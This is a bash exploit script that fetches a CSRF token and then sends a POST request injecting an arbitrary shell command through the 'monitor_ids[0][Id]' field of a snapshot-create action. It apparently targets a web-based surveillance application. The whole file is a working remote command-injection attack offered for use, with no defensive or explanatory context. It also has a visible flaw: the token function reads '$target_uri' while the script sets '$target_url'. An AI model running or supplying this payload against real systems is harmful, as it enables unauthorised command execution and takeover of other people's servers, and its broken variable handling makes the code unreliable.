#!/bin/bash

print_csrf_magic() {
    echo "[*] Fetching CSRF Token..."
    res=$(curl -s "$target_uri/index.php")

    if [[ $res =~ "__csrf_magic" ]]; then
        csrf_magic=$(echo "$res" | grep -oP '(?<=__csrf_magic" value=").*?(?=")')
        if [[ -n $csrf_magic ]]; then
            echo "[+] Got Token: $csrf_magic"
        else
            echo "[!] Unable to parse token."
            exit 1
        fi
    else
        echo "[!] Unable to fetch token."
        exit 1
    fi
}

execute_command() {
    print_csrf_magic

    echo "[*] Sending payload.."
    data="view=snapshot&action=create&monitor_ids[0][Id]=;$cmd&__csrf_magic=$csrf_magic"

    response=$(curl -s -X POST -d "$data" -m 5 "$target_url/index.php")
    if [[ $response =~ "200 OK" ]]; then
        echo "[+] Command executed successfully!!"
    else
      echo "[!] Failed to send payload (Error: $response)"
    fi
}

if [[ $# -ne 4 ]]; then
    echo "Usage: $0 -u <target_url> -c <command>"
    exit 1
fi

while [[ $# -gt 0 ]]; do
    key="$1"
    case $key in
        -u)
        target_url="$2"
        shift
        ;;
        -c)
        cmd="$2"
        shift
        ;;
        *)
        ;;
    esac
    shift
done

execute_command